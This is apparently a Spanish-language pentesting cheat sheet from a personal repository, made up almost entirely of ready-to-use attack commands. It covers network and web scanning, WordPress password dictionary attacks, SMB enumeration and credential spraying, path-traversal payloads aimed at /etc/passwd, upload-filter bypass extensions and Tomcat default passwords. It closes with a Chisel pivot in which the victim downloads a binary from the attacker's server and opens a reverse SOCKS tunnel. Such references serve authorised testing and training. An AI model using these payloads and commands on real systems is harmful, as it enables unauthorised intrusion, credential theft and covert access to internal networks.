
# Mi repositorio sobre herramientas y configuraciones para la fase de reconocimiento de vulnerabilidades. 

# Herramientas de escaneo 
## Nmap
```shell
- nmap -sn <ip/24>
- nmap -sV -sT -O -p- <ip>
- nmap -sTCV <ip>
- nmap --script vuln <ip>
- nmap -f -sS -sV -Pn --script auth <ip>
- nmap -f -sS -sV -Pn --script default <ip>
```
#### Puertos UDP
```shell
- nmap -sU -sC --top-ports 100 <ip>
```
## Gobuster
```shell
- gobuster dir -u <url> -w /home/kali/Downloads/seclist/directory-list-lowercase-2.3-medium.txt -x php,html,txt
```
#### Realizar fuzzing
```shell
- gobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt
```
## Nuclei
#### Escaneo de un solo objetivo
```shell
- nuclei -target https://example.com
```
#### Escaneo de varios objetivos
```shell
- nuclei -targets urls.txt
```
#### Network scan
```shell
- nuclei -target <ip>/24 
```
## Nikto
```shell
- nikto -h example.com
- nikto -h example.com -port 8083
- nikto -h example.com -maxtime number.of.seconds
```
## Wpscan
```shell
- wpscan --url <url>
```
### Ataque de diccionario
```shell
- wpscan --url <url> --passwords <ruta de diccionarios>
```
### Enumerar usuarios
```shell
- wpscan --url <url> --enumerate u 
```
## SMB
### Rpcclient
```shell
- rpcclient -U '' -N <ip objetivo>
```
- crackmapexec smb IP
- crackmapexec smb IP -u <usuario> -p <contraseña/directorio de contraseñas>

### Smbmap
```shell
- smbmap -H <IP> -R <carpeta>
- smbmap -H <IP> -u <USUARIO> -p <CONTRASEÑA>
- smbmap -H <IP> -u <USUARIO> -P <ARCHIVO_CON_CONTRASEÑAS>
```
### Smbclient
```shell
- smbclient //<IP>/<ruta> -U <usuario>
- smbclient -L //<IP> -U <USUARIO> 
```
### Rpcclient
```shell
- rpcclient -U '' -N <ip objetivo>
- rpcclient <IP> -U <USUARIO>
```
#### Comandos
```shell
- enumdomusers
- queryuser <RID> <--- Obtén detalles de un usuario específico.
enumdomgroups:
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
- netshareenum <--- Obtener detalles de recursos compartidos.
- getdominfo:
```

# Path Traversal 
```shell
- file=../../../../../../../etc/passwd
- file=/etc/passwd
- file=....//....//....//etc/passwd
- file=..%252f..%252f..%252fetc/passwd
- file=/var/www/images/../../../etc/passwd
- file=../../../etc/passwd%00.png 
```

# Upload extensions

```shell
- PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
- Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp
- ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
- Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
- Coldfusion: .cfm, .cfml, .cfc, .dbm
- Flash: .swf
- Perl: .pl, .cgi
- Erlang Yaws Web Server: .yaws
```
# Tomcat default credentials

```shell
admin:admin

tomcat:tomcat

admin:

admin:s3cr3t

tomcat:s3cr3t

admin:tomcat
```
# Pivoting
### Local 
```shell
- ssh -L <puerto local>:127.0.0.1:<puerto remoto> <usuario>@<ip> 
```
### Remoto
```shell
- ssh -R <puerto local>:127.0.0.1:<puerto remoto> <usuario>@<ip> 
```
### Dinámico 
```shell
- ssh -D <puerto local que actuará como proxy> <usuario>@<ip> 
```
### Uso e instalación Chisel
#### Lado atacante
```shell
- python3 -m http.server 80 <--- para descargar chisel de lado de la victima.
- chmod +x chisel_linux_amd64
- ./chisel_linux_amd64 --reverse -p <puerto> 
```
#### Lado víctima
```shell
- curl http://<ip>/chisel_linux_amd64 -o chisel <--- para descargar chisel en la victima con el servidor del atacante.
- chmod +x chisel
- ./chisel client <ip>:<ip> R:socks 
```
<div align="left">
  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" height="39" alt="linux logo"  />
</div>
